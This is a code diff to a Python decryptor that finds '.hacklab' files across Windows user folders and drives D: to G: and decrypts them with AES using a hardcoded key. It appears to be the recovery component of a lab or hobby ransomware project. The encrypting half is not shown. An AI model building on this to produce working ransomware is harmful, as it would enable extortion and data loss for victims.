@@ -24,7 +24,7 @@ from Crypto import Random
 from pathlib import Path
 from sys import stdout
 import time, os, base64
-
+userhome = os.path.expanduser('~')
 
 blue = "\033[94m"
 red = "\033[91m"
@@ -79,8 +79,9 @@ def decrypt(key, filename):
 		filesize = int(infile.read(16))
 		IV = infile.read(16)
 		decryptor = AES.new(key, AES.MODE_CBC, IV)
-
+		
 		with open(outputfile, 'wb') as outfile:
+                  
 			while True:
 				buf = infile.read(buffersize)
 
@@ -94,34 +95,28 @@ def decrypt(key, filename):
 list_f = []
 
 
-p = path('C:\\',
-         'D:\\',
-         'E:\\',
-         'F:\\',
-         'G:\\',
-         'I:\\',
-         'J:\\',
-         'K:\\',
-         'L:\\',
-         'M:\\',
-         'N:\\',
-         'O:\\',
-         'P:\\',
-         'Q:\\',
-         'R:\\',
-         'S:\\',
-         'T:\\',
-         'U:\\',
-         'V:\\',
-         'W:\\',
-         'X:\\',
-         'Y:\\',
-         'Z:\\')
+ca = Path(userhome + '\\Desktop\\')
+cb = Path(userhome + '\\Pictures\\')
+cc = Path(userhome + '\\Documents\\')
+cd = Path(userhome + '\\Videos\\')
+ce = Path(userhome + '\\Music\\')
+d = Path('D:\\')
+e = Path('E:\\')
+f = Path('F:\\')
+g = Path('G:\\')
 key = "aGFja2xhYg=="
 
 try:
-	searche = list(p.glob('**/*.hacklab'))
-	for x in searche:
+	searchea = list(ca.glob('**/*.hacklab'))
+	searcheb = list(cb.glob('**/*.hacklab'))
+	searchec = list(cc.glob('**/*.hacklab'))
+	searched = list(cd.glob('**/*.hacklab'))
+	searchee = list(ce.glob('**/*.hacklab'))
+	searche2 = list(d.glob('**/*.hacklab'))
+	searche3 = list(e.glob('**/*.hacklab'))
+	searche4 = list(f.glob('**/*.hacklab'))
+	searche5 = list(g.glob('**/*.hacklab'))
+	for x in searchea + searcheb + searchec + searched + searchee + searche2 + searche3 + searche4 + searche5:
 		x = str(x)
 		#x = x.split("/")[-1]
 		list_f.append(x)
